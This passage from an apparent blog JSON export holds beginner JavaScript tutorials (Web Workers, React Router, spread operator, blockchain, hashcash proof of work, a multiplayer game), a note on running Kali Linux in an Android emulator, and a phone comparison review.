        "content": "\nFor the longest time, Javascript has always been implemented using a single thread in your browser. For the most part, this wasn&#8217;t a problem. If you&#8217;re just using javascript for simple DOM manipulations or form submissions then a single thread is all you need. However, once developers started getting more advanced with their Javascript usage, this eventually led to an issue.\n\nLet&#8217;s say I have the following single page application (SPA) that shows a list of prime numbers from 1 to 600,000:\n\nIndex.html\n\npre&lt;!DOCTYPE html&gt;\n&lt;html lang=\"en\"&gt;\n &lt;head&gt;\n &lt;title&gt;Multithread Example&lt;/title&gt;\n &lt;meta charset=\"UTF-8\"&gt;\n &lt;meta name=\"viewport\" content=\"width=device-width, initial-scale=1\"&gt;\n &lt;/head&gt;\n &lt;body&gt;\n &lt;h1&gt;List of Primes from 1 to 600000&lt;/h1&gt;\n &lt;ul&gt;\n\n&lt;/ul&gt;\n &lt;script src=\"./single-thread.js\"&gt;&lt;/script&gt;\n &lt;/body&gt;\n&lt;/html&gt;/pre\n\nMy Index.html has an empty ul element that I want to append all the primes that I find to it. I call my single-thread.js file which does all the work.\n\n{{ ad }}\n\n Single-Thread.js\n\nprefunction isPrime(n) {\n if (n &gt; 1) {\n for (let i = 2; i &lt; n; i += 1) {\n if (n % i === 0) {\n return false;\n }\n }\n return true;\n }\n\nreturn false;\n}\n\n(function () {\n for (let i = 1; i &lt; 600000; i += 1) {\n if (isPrime(i)) {\n const li = document.createElement('li');\n li.innerHTML = i;\n document.querySelector('ul').appendChild(li);\n }\n }\n\n}());/pre\n\nMy single-thread.js file loops through all the numbers from 1 to 600,000 and prints out any prime that it finds and appends it to the ul element.\n\nThe Single Thread Problem\n\nIf you run this in your browser, it will work as intended (printing out all the primes from 1 to 600,000) but will cause for a terrible user experience. The UI will simply lock up until this script finishes executing. In fact, Chrome might even warn you that the page has become unresponsive. So even though I am telling Javascript to append my number to the list in the loop, all UI rendering gets paused until the script completes. Thus, the user is just staring at a blank loading window.\n\n{{ ad }}\n\n Multithreaded Javascript Using Web Workers\n\nJavascript Web Workers are the solution to this problem. A Web Worker is basically a task that runs in the background, separate from the UI thread. From the Web Worker, you can pass messages back and forth from the UI thread. Let&#8217;s redo the previous example using Web Workers.\n\nMulti-thread.js\n\nCreate a new file called Multi-thread.js and post the following in there:\n\npreif (window.Worker) {\n const myWorker = new Worker('./single-thread.js');\n myWorker.onmessage = function (e) {\n const li = document.createElement('li');\n li.innerHTML = e.data;\n document.querySelector('ul').appendChild(li);\n };\n}/pre\n\nThe if statement checks to see if the browser supports web workers. Unsurprisingly, browsers that are running IE 9 or older do not support Web Workers.\n\nI then initialize a new Web Worker by calling my single-thread.js in the worker&8217;s constructor. You can initialize as many workers as you want. Finally, for my worker, I implement an onMessage callback. This is so I can handle any messages passed from my web worker back to my multi-thread.js file. Anything that I do in this file will run on the UI thread. In this case, I append the result to the ul element.\n\nSingle-thread.js\n\nI made the following changes to my single-thread.js file:\n\nprefunction isPrime(n) {\n if (n &gt; 1) {\n for (let i = 2; i &lt; n; i += 1) {\n   if (n % i === 0) {\n    return false;\n   }\n  }\n  return true;\n }\n return false;\n}\n\n(function () {\n for (let i = 1; i &lt; 600000; i += 1) {\n  if (isPrime(i)) {\n   strongpostMessage(i);/strong\n  }\n }\n}());/pre\n\nThe only thing that I changed was calling the postMessage() function (and removing the ul append). Although this function is part of the window&8217;s properties, you don&#8217;t have to call it with window.postMessage() because you are already inside of a Web Worker context.\n\n{{ ad }}\n\nIndex.html\n\nFinally, make sure that you change your index.hmtl to point to the mult-thread.js file instread of your single-thread.js file:\n\npre&lt;script src=\"./multi-thread.js\"&gt;&lt;/script&gt;/pre\n\n The result\n\nIn order to make this work, you need to make sure that you are *running in a web server. *Loading the files through your documents directory in your browser will give you a cross origin exception in Chrome and Firefox.\n\nOnce everything is set up and you access the webpage, you will notice that items get appended to the list as soon as a new prime number is found. Unlike before, the user is not staring at a blank window and they can see the list getting updated in real-time.\n\na href=\"https://github.com/DaveBben/multithread-js\" target=\"_blank\" rel=\"noopener\"You can view the full project on GitHub./a\n\n&nbsp;\n\n&nbsp;\n",
        "tags": [
            "multithread",
            "ux",
            "web workers",
            "javascript"
        ]
    },
    {
        "uri": "/run-kali-linux-2-android/",
        "title": "Run Kali Linux 2 on Android",
        "content": "Kali Linux is a popular security-focused operating system that has many tools which could be used for penetration testing. In the past, I demonstrated how to a href=\"https://www.youtube.com/watch?v=uZ2eDb9EjzE\" target=\"_blank\" rel=\"noopener\"Run Kali Linux on Android/a (version 1.0) via the terminal. Now let&#8217;s take a look at how to run Kali Linux 2 on Android without root. To do this, we will be using Limbo PC Emulator. It makes use of the SDL library to emulate Kali Linux 2 on Android.\n\nDownload ISO\n\nBegin by downloading the a href=\"https://www.kali.org/downloads/\" target=\"_blank\" rel=\"noopener\"Kali Linux 2 ISO/a. The only version which I was able to get to boot was the Kali Linux 32 bit light.\n\n PC Limbo Emulator\n\nDownload PC Limbo Emulator from the play store. Once you open it up, create a new VM. Within the VM, you can specify the amount of RAM and CPU cores that you want to allocate. To be fair, I don&#8217;t believe this affects the actual emulation speed at all. It might just be what the OS &#8220;thinks&#8221; it has available. Go to CD ROM_ _and select the Kali Linux ISO you just downloaded. Also, if you wish to actually install Kali Linux, you can create a new virtual hard disk. I am just going to run it in live mode though. Finally, select the CD ROM as the boot device.\n\n{{ ad }}\n\nOnce you are set, you can start up Kali Linux. You might also want to connect a USB OTG cable so that you can use both the mouse and keyboard. Overall, the emulation speed is very slow. It took around 10 minutes until I was able to get to the login screen. Further, I encountered a strange bug after logging in that cause desktop environment to crash. Unfortunately, I didn&#8217;t have the patience to try to debug it and wait another 10 minutes to boot, so I left it at that.\n",
        "tags": [
            "emulation",
            "kali linux",
            "linux"
        ]
    },
    {
        "uri": "/navigate-in-reactjs-using-react-v4-router/",
        "title": "Navigate in ReactJS using React V4 Router",
        "content": "\nIf you are building a large single page application, there might come a time when you will need to add routes to different pages. Unlike traditional routes, adding routes in ReactJS does not trigger a page reload. This makes your SPA extremely fast and feels more like an actual application rather than a simple website. To navigate in ReactJS we will be using the React v4 router.\n\nSetting Up React V4 Router\n\nBegin by installing the React V4 Router from npm:\n\npre id=\"2e1b\" class=\"graf graf--pre graf-after--p\"npm install --save react-router-dom/pre\n\nNow, in your *index.js *you will need to import BrowserRouter and wrap it around your main App component. The reason for doing this is so that you will not have to manually pass the routes down to each component; this automatically sets that up for you.\n\npre//The usual imports above\nimport { BrowserRouter } from 'react-router-dom';\nReactDOM.render(&lt;BrowserRouter&gt;\n&lt;App /&gt;\n&lt;/BrowserRouter&gt;, document.getElementById('root'));/pre\n\n{{ ad }}\n\n ReactJS Router Switch\n\nNow it&#8217;s time to setup where you want each rendered route to be at. The simple solution is to use the switch component from react-router-dom. The switch component allows you to change render a different view in the component you place it in. So I am going to add the following in my App.js\n\npreimport { Switch, Route } from 'react-router-dom';\nimport ScreenA from './components/ScreenA';\nimport ScreenB from './components/ScreenB';\n\nclass App extends Component {\nrender() {\nreturn (\n&lt;Switch&gt;\n&lt;Route exact path=\"/\" component={ScreenA} /&gt;\n&lt;Route path=\"/b\" component={ScreenB} /&gt;\n&lt;/Switch&gt;\n);\n}\n}/pre\n\nI first imported the Switch and rotue components. I also created two other components called Screen A and B. Finally, in my render function I set the default route to go to ScreenA and if the path match /b component will switch to ScreenB.\n\nHere&#8217;s my ScreenA.js:\n\npreimport React from 'react'\nimport { Link } from 'react-router-dom'\nconst ScreenA = () =&gt;(\n&lt;div&gt;\n&lt;h1&gt;This is screen A&lt;/h1&gt;\n&lt;li&gt;&lt;Link to='/b'&gt;Go to screen B&lt;/Link&gt;&lt;/li&gt;\n&lt;/div&gt;\n)/pre\n\nexport default ScreenA;\n\nHere&#8217;s my ScreenB.js:\n\npreimport React from 'react'\nimport { Link } from 'react-router-dom'\nconst ScreenB = () =&gt; (\n&lt;div&gt;\n&lt;h1&gt;This is screen B&lt;/h1&gt;\n&lt;li&gt;&lt;Link to='/'&gt;Go to Screen A&lt;/Link&gt;&lt;/li&gt;\n&lt;/div&gt;\n)/pre\n\nexport default ScreenB;\n\nAnd the final result is this:\n\nimg class=\"alignnone size-full wp-image-91\" src=\"https://jsdeveloper.io/wp-content/uploads/2017/11/screen-A.png\" alt=\"\" width=\"437\" height=\"341\" /\n\nimg class=\"alignnone size-full wp-image-94\" src=\"https://jsdeveloper.io/wp-content/uploads/2017/11/Screen-B2.png\" alt=\"\" width=\"449\" height=\"417\" /\n\na href=\"https://github.com/DaveBben/react-v4-router\" target=\"_blank\" rel=\"noopener\"View code on GitHub/a\n\n&nbsp;\n\n[1]: https://jsdeveloper.io/wp-content/uploads/2017/11/screen-A.png\n[2]: https://jsdeveloper.io/wp-content/uploads/2017/11/Screen-B2.png\n",
        "tags": [
            "navigator",
            "reactjs",
            "router",
            "v4"
        ]
    },
    {
        "uri": "/understanding-the-javascript-spread-operator-2/",
        "title": "Understanding the JavaScript Spread Operator",
        "content": "\nThere&#8217;s a good chance that you have probably come across the Javascript spread operator. If you are unsure, here&#8217;s what it looks like:\n\npre{...}/pre\n\nGood luck trying to google search that as you will probably get an empty results page. The Javascript spread operator is a new syntax found in ES6 (ECMAScript2015). The purpose of the spread operator is to allow an iterable like an array or string to be expanded (or spread) across another object or array.\n\nCloning Array Using Spread Operator\n\nThe most common use of the spread operator is to clone an array. For example, say I do the following:\n\npre var a = ['A', 'B',' C'];\n\nvar b =  a;/pre\n\nIn pretty much any language, you could easily guess the problem that will occur here. Once you assign variable B to A, B now points to the memory location of A. This means that if you were to change A at some point later in your program, B will also get altered. So the simple way around that is to use the slice command.\n\n{{ ad }}\n\npre var a = ['A', 'B',' C'];\n\nvar b =  a.slice();/pre\n\nThis returns a shallow copy of A to B. So now any changes that you make to A will not alter B. An alternative way of doing this is using the Javascript spread operator:\n\npre var a = ['A', 'B',' C'];\n\nvar b =  [...a]/pre\n\nKeep in mind, if your array contains objects or other arrays, then you will still need to a href=\"https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/GlobalObjects/Object/assignDeepClone\" target=\"_blank\" rel=\"noopener\"perform a deep clone/a.\n\nReact and Redux Spread Operator\n\nThe most common place that you will encounter the spread operator is when using reactjs and redux. Whenever you update an object, it&8217;s always using the spread syntax:\n\nprethis.setState({ review: { ...this.state.review, score: event.target.value } });/pre\n\nIn the above example, I set the state of the review object to a new object that contains the properties of the existing state object, along with the changed property of score. That&#8217;s pretty much all there is to the spread operator. If you want a really in-depth look, check out a href=\"https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Operators/Spreadoperator\" target=\"blank\" rel=\"noopener\"MDN&#8217;s documentation on it. /a\n",
        "tags": []
    },
    {
        "uri": "/understanding-the-javascript-spread-operator/",
        "title": "Understanding the JavaScript Spread Operator",
        "content": "\nThere&#8217;s a good chance that you have probably come across the Javascript spread operator. If you are unsure, here&#8217;s what it looks like:\n\npre{...}/pre\n\nGood luck trying to google search that as you will probably get an empty results page. The Javascript spread operator is a new syntax found in ES6 (ECMAScript2015). The purpose of the spread operator is to allow an iterable like an array or string to be expanded (or spread) across another object or array.\n\nCloning Array Using Spread Operator\n\nThe most common use of the spread operator is to clone an array. For example, say I do the following:\n\npre var a = ['A', 'B',' C'];\n\nvar b =  a;/pre\n\nIn pretty much any language, you could easily guess the problem that will occur here. Once you assign variable B to A, B now points to the memory location of A. This means that if you were to change A at some point later in your program, B will also get altered. So the simple way around that is to use the slice command.\n\n{{ ad }}\n\npre var a = ['A', 'B',' C'];\n\nvar b =  a.slice();/pre\n\nThis returns a shallow copy of A to B. So now any changes that you make to A will not alter B. An alternative way of doing this is using the Javascript spread operator:\n\npre var a = ['A', 'B',' C'];\n\nvar b =  [...a]/pre\n\nKeep in mind, if your array contains objects or other arrays, then you will still need to a href=\"https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/GlobalObjects/Object/assignDeepClone\" target=\"_blank\" rel=\"noopener\"perform a deep clone/a.\n\nReact and Redux Spread Operator\n\nThe most common place that you will encounter the spread operator is when using reactjs and redux. Whenever you update an object, it&8217;s always using the spread syntax:\n\nprethis.setState({ review: { ...this.state.review, score: event.target.value } });/pre\n\nIn the above example, I set the state of the review object to a new object that contains the properties of the existing state object, along with the changed property of score. That&#8217;s pretty much all there is to the spread operator. If you want a really in-depth look, check out a href=\"https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Operators/Spreadoperator\" target=\"blank\" rel=\"noopener\"MDN&#8217;s documentation on it. /a\n",
        "tags": []
    },
    {
        "uri": "/google-pixel-2-xl-vs-galaxy-note-8/",
        "title": "Google Pixel 2 XL vs Galaxy Note 8",
        "content": "The Google Pixel 2 XL and the Galaxy Note 8 are two excellent devices. They are so good, that I would be lying if I told you that it was easy to make a decision between these two devices. Deciding which one to buy is going to come down to a lot of personal preference and trivial differences. So let&#8217;s do a comparison of the Google Pixel 2 XL vs Galaxy Note 8.\n\nFeel in the hand\n\nI always find that one of the most important aspects of a smartphone is how they feel in the hand. The Galaxy Note 8 and Google Pixel XL 2 are both slippery and fragile phones, no surprise. However, the Pixel feels much easier to hold. This makes sense as it&8217;s a slightly smaller (6.2 inch) and lighter (175 g)  phone than compared to the Galaxy Note 8 (6.4 inch, 195 g). The Note 8 is taller than it is wider, and I absolutely hate that about this phone. I remember back to the old HTC M8, which suffered this same design flaw.\n\nHaving a tall phone makes it difficult to reach the poorly placed fingerprint reader at the top (damn you Samsung) and pull down the notification shade. Fortunately, Samsung does offer a one-handed mode that you won&#8217;t find in stock Android. But still, I find that I am accelerating my future arthritis from my fingers cramping so much when trying to reach the top of the screen. It could be I just have very small hands, but I would absolutely prefer to hold the Pixel in one hand for an hour rather than the Note 8.\n\ntl;dr &#8211; Pixel 2 XL feels much better to hold.\n\n{{ ad }}\n\nDisplay\n\nNow for the elephant in the room. As you might have heard, the Pixel XL 2 has suffered from an enormous amount of display issues. The first one was the case of the poorly saturated screen. For some reason, Google decided to make the colors on the Pixel be natural and true to life. But here&8217;s the problem&#8230;our eye doesn&#8217;t like natural, true to life colors. Collectively, our eyes prefer that vibrant, bold and slightly over-saturated display the Samsung offers. So when you initially opened up the Pixel&#8230;it was a disgrace. I think Google tuned down the colors way too far. Everything looked so dull and lifeless. I felt like I was getting mild depression just by looking at the display. It also became very apparent when comparing images. On the Google Pixel, any image with skin tones just didn&#8217;t look right. And if you tried editing it by boosting up the saturation and color temperature before posting it on Instagram, it would be a nightmare. On everyone else&#8217;s beautiful iPhones and Galaxys, the image would look too oversaturated because they already have that saturation boost in their display that you don&#8217;t have in yours.\n\n*Luckily, Google released a software update to fix this issue. So everything I just said above is now irrelevant. *\n\nBut let&#8217;s move on to problem number two, the screen burn issue. Unfortunately, I was also personally affected by the issue and it&#8217;s really annoying. After only two weeks of usage, I already have screen burn in near the navigation buttons. This is completely unacceptable for a $800 device. No excuse should be made for this.\n\nAnd don&#8217;t even get me started on the blue shift. It&#8217;s definitely noticeable but doesn&#8217;t bother me as much as theburn-inn.\n\nEven so, I would 100% say that the Galaxy Note 8 just has the all-around better display. It gets brighter and darker than the Pixel, still a little more vibrant, doesn&#8217;t suffer from the *blue shift issue, *or screen burn in.\n\ntl;dr &#8211; Galaxy Note 8 has the much better display\n\nCamera\n\nThis is where things start to get trivial. Both devices have an amazing camera. And let&8217;s be real, if you&#8217;re only posting your images on social media where they are going to be compressed anyway then even a mid-range phone&#8217;s camera is well qualified. However, I am impressed that the Google Pixel can do portrait mode with one camera. Also, pictures taken in portrait mode look slightly better on the Pixel than they do on the Galaxy Note 8. Also, you can do front facing portrait photos on the Pixel. On the Note 8, you do have a front-facing selective focus that doesn&#8217;t really work that well. On the flip side, you can adjust the bokeh effect on the Note 8 with portrait mode, something that you can&#8217;t do on the Pixel.\n\nAs for the video, I haven&#8217;t really tested it that much on either device to have an opinion.\n\nThe Galaxy Note 8 does have a better camera app than the Pixel. It offers more manual control and &#8220;pro&#8221; features. The Pixel&#8217;s camera software is essentially barebones.\n\ntl;dr &#8211; Both devices have a great camera. The Pixel 2 XL has a better portrait mode, the Galaxy Note 8 offers more manual controls.\n\n{{ ad }}\n\nBattery\n\nThis is probably the most non-trivial difference between these two devices. The Pixel 2 XL has a fantastically better battery than the Galaxy Note 8. After 24 hours of mixed usage, I still had 50% battery life left on the Pixel with 4 hours of screen on time. The battery life on the Google Pixel 2 XL is amazing! Legit, that&8217;s the thing that I probably love the most about this device. Also, it charges a slightly faster than the Galaxy Note 8.\n\nThe Galaxy Note 8&#8217;s battery life is&#8230;.average. You are going to have to charge after 8 hours regardless of what you&#8217;re doing. It just doesn&#8217;t compare to the Pixel. For the Note 8, I have all the optimizations on and it still doesn&#8217;t match up with the Pixel 2 XL.\n\ntl;dr &#8211; The Pixel 2 XL has the better battery\n\nPerformance\n\nOh boy&8230;this is where the flame war starts. As you know, the Google Pixel 2 XL runs stock Android. The Galaxy Note 8 runs Android along with the Samsung Experience skin. The advantage of stock Android is that it&#8217;s fast, smooth and efficient. There are no unwanted pre-installed apps. The advantage of Samsung Experience skin is that you get all the cool things that you don&#8217;t find in stock Android such as S-Pen features, Game Mode, Secure Folder, Themes, etc. When it comes to the overall performance, the Pixel 2 XL is a beast! Samsung users (trust me I am one of them), you don&#8217;t realize it but your device is slow.\n\nTrust me, the Note 8 isn&#8217;t laggy or doesn&#8217;t suffer from extreme moments of slow-down, but as soon as you pick up and use the Pixel, you realize just have unimpressive the UI performance is on the Note 8. Again, I am not saying that the Note 8 is slow and laggy. There seems to be that common misconception on the internet. What I am saying is that the Galaxy Note 8 does not offer a consistently smooth 60 fps when scrolling and moving around the UI that the Pixel 2 XL does. The Pixel 2 XL does not suffer from the signature &#8220;Samsung stutter&#8221; or the occasional jaggedness or drop frames that Samsung devices are known for.\n\nWhether or not this bothers you is an entirely different question. There are some people who are perfectly fine playing games at 30fps while others wouldn&#8217;t tolerate anything less than 60.\n\ntl;dr &#8211; The Pixel 2 XL offers consistently better performance.\n\n{{ ad }}\n\nStuff You Probably don&8217;t care about\n\nOkay, let&#8217;s just bang these out of the way:\n\n  The Galaxy Note 8 has expandable memory, the Pixel doesn&#8217;t\n  The Pixel 2 has front-facing speaker, the Galaxy Note 8 doesn&#8217;t\n  The Galaxy Note 8 is IP68, the Pixel is IP67\n  The Galaxy Note 8 has the S-Pen, the Pixel doesn&#8217;t.\n  The Galaxy Note 8 has iris scanning, the Pixel doesn&#8217;t.\n  The Pixel is guaranteed to get future Android updates for the next 2 years, the Note 8 isn&#8217;t.\n\nVerdict\n\nLike I said at the beginning, both of these are amazing devices. For myself, it has been hard to choose which one I wanted to keep. So here&8217;s the thing, if you intend on keeping your phone for more than 1 year and you only use your phone for Reddit and Instagram and Facebook, get the Google Pixel 2 XL. **Otherwise, the **Galaxy Note 8 *is the better bang for your buck.*\n\n&nbsp;\n",
        "tags": [
            "galaxy note 8",
            "google pixel 2 xl",
            "reviews"
        ]
    },
    {
        "uri": "/javascript-blockchain/",
        "title": "Build a Javascript Blockchain",
        "content": "\nBlockchain! It&#8217;s the mystical buzzword that every company is saying right now. At its core, the basic concept of blockchain is not hard to understand; it&#8217;s essentially a distributed linked list. It&#8217;s also used by the popular cryptocurrency called Bitcoin. The advantages of Blockchain is that it allows for a decentralized collection of data whose integrity is easily verifiable, and the data itself is immutable Keep in mind that a fully robust blockchain will also contain smart contracts, a href=\"https://www.davebennett.tech/javascript-hashcash-proof-work/\" target=\"_blank\" rel=\"noopener\"mining algorithms (proof of work/proof of stake)/a and other flavorful elements that you could enhance the chain with. For this tutorial, we are going to stick with the bare minimum. We are going to implement a pure Javascript Blockchain.\n\nThe Javascript Blockchain\n\nBefore we get started, let&8217;s cover some basic concepts. A blockchain always starts off with an initial block called the genesis block. The contents of each block contain the following fields:\n\nIndex\nTimestamp\nData\nNonce\nPreviousHash\nHash\n\nFor this tutorial, we are going to exclude the nonce field because we will not be implementing a mining algorithm. The block&#8217;s hash is a SHA256 hash that is made from combining all the fields listed above. What&#8217;s cool about a blockchain is that every block will contain the hash of the previous block. This means that the chain becomes immutable. If any of the data in the previous blocks were to change, then the block would contain a new hash, resulting in an invalidation of the rest of the chain.\n\n{{ ad }}\n\nBlock Class\n\nLet&8217;s start by creating a simple block class:\n\npreconst crypto = require('crypto');\n\nclass Block {\n constructor(index, timestamp, data, previousHash) {\n this.index = index;\n this.previousHash = previousHash;\n this.timestamp = timestamp;\n this.data = data;\n this.hash = this.calculateHash();\n }\n // Calculating the Hash for the block\n calculateHash() {\n const stringToHash = this.index + this.previousHash + this.timestamp + JSON.stringify(this.data);\n return crypto.createHash('sha256').update(stringToHash).digest('hex');\n }\n}\n\nmodule.exports = Block;/pre\n\nThis class&#8217;s constructor contains all the information that we would want for a new block. The only function in this class is calculateHash().  You will need to install the crypto library from npm to use the crypto.createHash function.\n\nBlockchain Class\n\nCreate another class called blockchain. The purpose of this class is to hold the actual chain and provide us with some functions that we can use to interact with the blockchain. Start by adding the constructor:\n\npreconst Block = require('./block');\n\nclass Blockchain {\n // Initialize Blockchain with genosis block\n constructor() {\n this.chain = [new Block(0, new Date().toUTCString(), 'I am the genosis block', '0')];\n }\n}\n\nmodule.exports = Blockchain;/pre\n\nNotice that in the constructor we initialize the chain as an array (that&8217;s your only option for lists in Javascript). In this array, we have to provide a default genosis block. This block will have 0 for the previous hash because there are no blocks that come before it. Now let&#8217;s add in the rest of the methods we will need:\n\npreconst Block = require('./block');\n\nclass Blockchain {\n// Initialize Blockchain with genosis block\nconstructor() {\nthis.chain = [new Block(0, new Date().toUTCString(), 'I am the genosis block', '0')];\n}\n// Getting the hash of the latest block in the blockchain\ngetPreviousHash() {\nreturn this.chain[this.chain.length - 1].hash;\n}\n// Adding a new block to the chain\naddBlock(data) {\nconst timeStamp = new Date().toUTCString();\nconst index = this.chain.length;\nconst previousHash = this.getPreviousHash();\nconst newBlock = new Block(index, timeStamp, data, previousHash);\nif (this.isValid(newBlock)) {\nthis.chain.push(newBlock);\n} else {\nconsole.log('Block is invalid');\n}\n}\n// Checking to see if the new block is valid\nisValid(newBlock) {\nconst currentBlock = this.chain[this.chain.length - 1];\nif (currentBlock.index + 1 !== newBlock.index) {\nreturn false;\n} else if (newBlock.previousHash !== currentBlock.hash) {\nreturn false;\n} else if (newBlock.hash !== newBlock.calculateHash()) {\nreturn false;\n}\nreturn true;\n}\n\nprintChain() {\nconsole.log(this.chain);\n}\n}\n\nmodule.exports = Blockchain;/pre\n\nIn this class, we created four functions. The getPreviousHash() function just returns the hash of the latest block in the chain. We need this because every new block needs to have the hash of the previous block. This function only gets called in the *addBlock() *function.\n\n{{ ad }}\n\nIn the addBlock() function, we a parameter called data that can contain any arbitrary piece of data. We then set all the necessary information we need to form a new block. Before we add the block to the chain, we need to call the isValid() function.\n\nThe isValid() functions checks to see if the block has the correct hash, index and it&#8217;s previous hash is equal to the hash of the latest block in the blockchain. If all of this is true, then we return true and add the block to the blockchain. There&#8217;s also a print() function that allows us to print the chain.\n\nApp Class\n\nFinally, create a class called app. This will be the class that we use to run the program. Here&8217;s what it looks like:\n\npreconst Blockchain = require('./blockchain');\n\nconst myChain = new Blockchain();\nmyChain.addBlock('Hey I am the second block');\nmyChain.addBlock('Hey I am the third block');\nmyChain.printChain();/pre\n\nThat&#8217;s it! When you run the app class you should get an output that contains your chain. The output should have three blocks with the appropriate data in each block. That&#8217;s how to build a basic blockchain in javascript.\n\na href=\"https://github.com/DaveBben/javascript-blockchain/tree/master\" target=\"_blank\" rel=\"noopener\"You can check out the full project on GitHub./a\n\n&nbsp;\n",
        "tags": [
            "blockchain",
            "javascript"
        ]
    },
    {
        "uri": "/javascript-hashcash-proof-work/",
        "title": "Javascript Hashcash Proof of Work",
        "content": "\nSuppose that you developed an app that will give users free stuff when they click a button. Obviously, there&#8217;s nothing stopping one user from spamming the button one million times and collecting a whole bunch of free stuff. If you wanted to prevent that, you could use something like a CAPTCHA, or perhaps give each user a session and cool off period. You could also implement something called a proof of work system.\n\nIf you have been reading up on Bitcoin and blockchain, then you are probably familiar with the idea of &#8220;proof of work.&#8221; Proof of work (POW) is a measure that a program or system can implement to deter malicious users from performing Dos attacks or spamming the program&#8217;s resources. Essentially, it forces the user to perform some complex and energy costing calculation before they are able to access the resource. Once the calculation is performed, the answer could be easily verified by other nodes on the network. When dealing with cryptocurrency this is essential because it prevents a computer from spamming the blockchain with a bunch of invalid new blocks.\n\n{{ ad }}\n\nThe most popular proof of work system is the hashcash proof of work. This proof of work system requires the computer to find a hash of a plaintext string combined with an arbitrary piece of data (nonce) to make a hash that begins with a certain number of zeros. For example, say we have the string &#8220;cat.&#8221; Let&#8217;s say that then creates a hash of &#8220;abchdlerfergh&#8221; using the SHA-256 hash scheme. However, we want the hash to start with three zeroes so it will be &#8220;000ehbskfjek.&#8221; What we will do is take a number starting at 0, then hash it with out plaintext string and see if it gives us the desired output. If it doesn&#8217;t, we will increase the number until it does. A javascript hashcash proof of work implementation would work the exact same way since we are essentially just taking advantage of the crpyto library in NodeJS.\n\nJavascript Hashcash Proof of Work\n\nFor this, we will be using NodeJS. Let&8217;s begin by importing the crypto library:\n\npreconst crypto = require('crypto');/pre\n\nNext, we will create a function to generate a string that will be approximately 1 MB. This will be our plaintext data that we will hash.\n\nprefunction randomChallengeString() {\n let longString = '';\n for (let i = 0; i &lt; 1000000; i += 1) {\n  longString += Math.random().toString(36).substr(2, 1);\n }\n return longString;\n}/pre\n\nFinally, let&#8217;s create a function that will continously loop until we find a hasht hat begins with three zeroes. Once we find it, we will print out the answer.\n\npre(function doWork() {\n const challengeString = randomChallengeString();\n let nonce = 0;\n const startDate = new Date();\n let hash = crypto.createHash('sha256').update(challengeString + nonce).digest('hex');\n while (hash.substr(0, 3) !== '000') {\n  hash = crypto.createHash('sha256').update(challengeString + nonce).digest('hex');\n  nonce += 1;\n }\n const endDate = new Date();\n console.log('Found the answer');\n console.log(The answer is ${nonce} with a final hash of ${hash});\n console.log(${(endDate - startDate) / 1000} seconds to complete);\n}());/pre\n\n{{ ad }}\n\nOnce it&#8217;s done, you should get an output that looks like this:\n\nNow keep in mind, Bitcoin looks for a hash that begins with about 17 zeroes. So compared to bitcoin this is pretty easy. Obviously, the more zeroes that you look for, the longer this will take to complete.\n\na href=\"https://github.com/DaveBben/proof-of-work-javascript\" target=\"_blank\" rel=\"noopener\"You can find the full project over on GitHub./a\n\n&nbsp;\n\n[1]: http://localhost/wordpress/wp-content/uploads/2017/12/hash-answer.png\n",
        "tags": [
            "blockchain",
            "hashcah",
            "javascript",
            "pow",
            "proof of work"
        ]
    },
    {
        "uri": "/build-a-mmo-game-with-javascript-and-nodejs/",
        "title": "Build a Multiplayer game using Javascript",
        "content": "\nIn this tutorial, we will take a look at how to build a multiplayer game using Javascript and NodeJS. My goal is to take you through the basic setup so that you can begin focusing on the actual gameplay. When building a full-scale MMO, there are a lot of things to consider like load balancing, network contingencies, etc. For now, we are going to focus on the bare minimum just to help you get an understanding of how you can creatively and effectively use the available tools of NodeJS to get started.\n\nOverview\n\nWe are first going to put together a NodeJS server. This server will host our application (index.html) and also communicate with the web page via a href=\"https://developer.mozilla.org/en-US/docs/Web/API/WebSocketsAPI\" target=\"blank\" rel=\"noopener\"web sockets./a Then we will create a simple HTML5 page with a canvas. The canvas will draw all the players (as squares) on the map. When the player connects, he will receive spawn on the map at a random position with a random color. The player will also be able to move freely around the map using the WASD keys. Finally, when a player disconnects we must make sure that we remove him from the map. So let&8217;s build a Multiplayer game using Javascript!\n\nPutting Together the Server\n\nBegin by creating a new NodeJS project, and a file called app.js. Afterward, install the following dependencies:\n\nprenpm install express --save\n\nnpm install socket.io --save/pre\n\nWe will be using express to server our web application and socket io for its web sockets functionality. Another reason that I chose socket.io is that it&8217;s able to fall back to long-polling if your browser doesn&#8217;t support web sockets. It is also capable of gracefully handling network reconnects on signal disruption. Put the following in app.js:\n\npreconst express = require('express');\nconst app = express();\nconst server = require('http').Server(app);\nconst io = require('socket.io')(server);\n\nconst socketClients = require('./controllers/client')(io);\n\napp.use(express.static('public'));\n\nserver.listen(3000, () =&gt; console.log('Game running'));/pre\n\nThe code above is creating an express server and binding it together with socket.io. We are also exposing a folder called public. Inside of that folder, we will put all the files of our web application. Also, note my use of the following line:\n\npreconst socketClients = require('./controllers/client')(io);/pre\n\nTo keep everything clean, I am going to put all of my socket.io event handlers inside of another file that called client.js. This file will be located in a folder called controllers.\n\n{{ ad }}\n\nWebpage\n\nInside of the public folder, create a file called index.html. This will be the HTML for our main application. Put the following in that file:\n\npre&lt;!DOCTYPE html&gt;\n&lt;!--[if lt IE 7]&gt; &lt;html class=\"no-js lt-ie9 lt-ie8 lt-ie7\"&gt; &lt;![endif]--&gt;\n&lt;!--[if IE 7]&gt; &lt;html class=\"no-js lt-ie9 lt-ie8\"&gt; &lt;![endif]--&gt;\n&lt;!--[if IE 8]&gt; &lt;html class=\"no-js lt-ie9\"&gt; &lt;![endif]--&gt;\n&lt;!--[if gt IE 8]&gt;&lt;!--&gt;\n&lt;html class=\"no-js\"&gt;\n&lt;!--&lt;![endif]--&gt;\n\n&lt;head&gt;\n&lt;meta charset=\"utf-8\"&gt;\n&lt;meta http-equiv=\"X-UA-Compatible\" content=\"IE=edge\"&gt;\n&lt;title&gt;MMORPG Game&lt;/title&gt;\n&lt;meta name=\"description\" content=\"\"&gt;\n&lt;meta name=\"viewport\" content=\"width=device-width, initial-scale=1\"&gt;\n&lt;link rel=\"stylesheet\" href=\"./styles/games.css\" type=\"text/css\" /&gt;\n&lt;/head&gt;\n\n&lt;body&gt;\n&lt;!--[if lt IE 7]&gt;\n&lt;p class=\"browsehappy\"&gt;You are using an &lt;strong&gt;outdated&lt;/strong&gt; browser. Please &lt;a href=\"\"&gt;upgrade your browser&lt;/a&gt; to improve your 